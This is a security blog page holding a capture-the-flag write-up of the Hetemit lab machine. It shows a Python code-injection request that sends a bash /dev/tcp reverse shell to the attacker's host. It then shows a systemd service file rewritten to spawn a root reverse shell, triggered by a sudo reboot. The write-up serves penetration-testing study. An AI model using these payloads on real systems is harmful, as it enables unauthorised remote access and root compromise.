<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hetemit - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary of ResultHetemit is a system where we’ll exploit the Code Injection vulnerability to acquire an initial access. We’ll then escalate our privilege by ...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/hetemit-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Hetemit - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/hetemit-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Hetemit - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 01, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary of Result</strong></h1><p>Hetemit is a system where we’ll exploit the <strong>Code Injection</strong> vulnerability to acquire an initial access. We’ll then escalate our privilege by abusing <strong>a misconfigured service file</strong> and compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We’ll begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> nmap/services 192.168.118.117
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">))</span>
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 63
50000/tcp open  http        syn-ack ttl 63 Werkzeug httpd 1.0.1 <span class="o">(</span>Python 3.6.8<span class="o">)</span>
</code></pre></div></div><p>→ There are a few open services. Within the scope of the writeup, we focus on the <code class="language-plaintext highlighter-rouge">HTTP</code> service running on port <code class="language-plaintext highlighter-rouge">50000</code>.</p><p><br></p><h4 id="http50000"><strong>HTTP/50000</strong></h4><p>Navigate to the web application, we notice that there are two directories listed.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/generate
/verify
</code></pre></div></div><p>Both directories have their own functions, we are particularly interested in the <code class="language-plaintext highlighter-rouge">/verify</code> one.</p><p>Let’s us try to send a <code class="language-plaintext highlighter-rouge">POST</code> request against the directory <code class="language-plaintext highlighter-rouge">/verify</code> and the body request is filled with the <code class="language-plaintext highlighter-rouge">code</code> parameter.</p><p>The payload might look as following:</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /verify HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<span class="ge">*/*</span>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

code=whoami
</code></pre></div></div><p>After the request was sent, we can further inspect response.</p><p>Here is the response.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 20 Aug 2021 05:01:07 GMT

<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
<span class="nt">&lt;title&gt;</span>500 Internal Server Error<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Internal Server Error<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.<span class="nt">&lt;/p&gt;</span>
</code></pre></div></div><p>The response code <code class="language-plaintext highlighter-rouge">500 INTERNAL SERVER ERROR</code> indicates that something is wrong at the backend. At this point, we fully comprehend that the server does not sanitize our input properly, which ends up our entry breaking something up at the other end.</p><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="code-injection"><strong>Code Injection</strong></h4><p>Previously, we identify the <strong>abnormal behaviour</strong> from the server. It’s worth noticing that the server running on port 50000 is <code class="language-plaintext highlighter-rouge">Werkzeug</code> (we can observe this from the <code class="language-plaintext highlighter-rouge">nmap</code> result). Primarily, <code class="language-plaintext highlighter-rouge">Werkzeug</code> is a web server written in <code class="language-plaintext highlighter-rouge">python</code>, if there is a potential code injection vulnerability, our payload should also be crafted in <code class="language-plaintext highlighter-rouge">python</code>.</p><p>Let’s us build a reverse shell in one line.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gs">__import__</span>("os").system("bash+-c+'bash+-i+&gt;%26+/dev/tcp/192.168.49.101/80+0&gt;%261'")
</code></pre></div></div><p>The entire payload is as follow:</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /verify HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<span class="ge">*/*</span>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

code=__import__("os").system("bash+-c+'bash+-i+&gt;%26+/dev/tcp/192.168.49.101/80+0&gt;%261'")
</code></pre></div></div><p>After the request is sent, our <code class="language-plaintext highlighter-rouge">nc</code> should catch the reverse shell at port 80 as <code class="language-plaintext highlighter-rouge">cmeeks</code> after a few seconds.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 80
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>192.168.49.101] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.101.117] 43194
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1400<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
<span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span><span class="nb">whoami
whoami
</span>cmeeks
<span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>cmeeks<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>cmeeks<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>cmeeks<span class="o">)</span>
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="misconfigured-service-file"><strong>Misconfigured Service File</strong></h4><p>Enumerating the target system locally exposes a <code class="language-plaintext highlighter-rouge">pythonapp.service</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span>find / <span class="nt">-group</span> cmeeks <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"home</span><span class="se">\|</span><span class="s2">tmp</span><span class="se">\|</span><span class="s2">proc"</span>
  5015736      4 <span class="nt">-rw-rw-r--</span>   1  root     cmeeks        302 Nov 13  2020 /etc/systemd/system/pythonapp.service
</code></pre></div></div><p>Essentially, the service file allows a service to run as the system boots. Since we have a write permission against the file, we can obviously inject a malicious command and wait until the system boots up and obtain the reverse shell as <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Now, we should adjust the <code class="language-plaintext highlighter-rouge">pythonapp.service</code>. It depends on how we want the code to be executed.</p><p>The following payload will initilize a reverse connection to our machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span>nano /etc/systemd/system/pythonapp.service
...
<span class="o">[</span>Service]                                     
<span class="nv">Type</span><span class="o">=</span>simple                   
<span class="nv">WorkingDirectory</span><span class="o">=</span>/home/cmeeks/restjson_hetemit
<span class="nv">ExecStart</span><span class="o">=</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/192.168.49.101/18000 0&gt;&amp;1'</span>
<span class="nv">TimeoutSec</span><span class="o">=</span>30                             
<span class="nv">RestartSec</span><span class="o">=</span>15s                                
<span class="nv">User</span><span class="o">=</span>root
<span class="nv">ExecReload</span><span class="o">=</span>/bin/kill <span class="nt">-USR1</span> <span class="nv">$MAINPID</span>
<span class="nv">Restart</span><span class="o">=</span>on-failure
...
</code></pre></div></div><p>At this point, we need to wait until the system reboots, or there is another option …</p><h4 id="sudo-permission"><strong>SUDO Permission</strong></h4><p>User <code class="language-plaintext highlighter-rouge">cmeeks</code> can execute <code class="language-plaintext highlighter-rouge">sudo</code> command to <code class="language-plaintext highlighter-rouge">reboot</code>, <code class="language-plaintext highlighter-rouge">shutdown</code> or <code class="language-plaintext highlighter-rouge">halt</code> the system with <code class="language-plaintext highlighter-rouge">root</code> privilege.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>cmeeks on hetemit:
    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User cmeeks may run the following commands on hetemit:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">reboot</code> is exactly what we’re searching for!. Now, on the <code class="language-plaintext highlighter-rouge">cmeeks</code> shell, execute.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cmeeks@hetemit restjson_hetemit]<span class="nv">$ </span><span class="nb">sudo</span> /sbin/reboot
</code></pre></div></div><p>At the same time, we should open up another terminal on local host with a <code class="language-plaintext highlighter-rouge">nc</code> listener ready on port 18000.</p><p>After a few seconds, we got <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 18000                                                                                                                                                                      130 ⨯
listening on <span class="o">[</span>any] 18000 ...
connect to <span class="o">[</span>192.168.49.101] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.101.117] 42660
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1211<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
<span class="o">[</span>root@hetemit restjson_hetemit]# <span class="nb">whoami
whoami
</span>root
<span class="o">[</span>root@hetemit restjson_hetemit]# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2021 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>